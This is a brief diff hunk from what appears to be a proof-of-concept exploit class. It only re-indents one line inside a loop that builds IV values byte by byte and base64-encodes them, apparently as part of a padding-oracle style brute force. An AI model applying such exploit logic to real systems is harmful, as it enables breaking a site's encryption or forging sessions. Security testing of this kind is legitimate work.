@@ -58,7 +58,7 @@ class Poc(ABPoc):
                 bglen = 0
                 for k in range(0, 255):
                     IV = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
-                        chr(k)
+                         chr(k)
                     bgstr = 'A' * 21 + '1'
                     enstr = base64.b64encode(IV).replace(
                         '=', '').replace('/', '-').replace('+', '-')
